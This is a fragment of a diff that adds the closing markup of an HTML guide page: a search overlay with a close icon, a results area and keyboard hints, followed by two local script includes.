+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
